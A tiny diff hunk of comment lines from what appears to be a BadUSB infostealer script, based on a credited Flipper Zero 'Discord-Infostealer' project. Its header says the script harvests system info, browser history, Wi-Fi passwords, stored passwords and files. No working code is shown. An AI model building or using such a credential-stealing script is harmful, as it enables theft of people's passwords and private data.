@@ -1,6 +1,4 @@
 #This Code is based on Beige Worm InfoStealer: https://github.com/beigeworm/BadUSB-Files-For-FlipperZero/tree/main/Discord-Infostealer
-#And 
-
 #Made by 888o
 
 # --- SYSTEM INFO, BROWSER HISTORY, WIFI PASSWORDS, STORED PASSWORDS, AND FILE COLLECTION SCRIPT ---
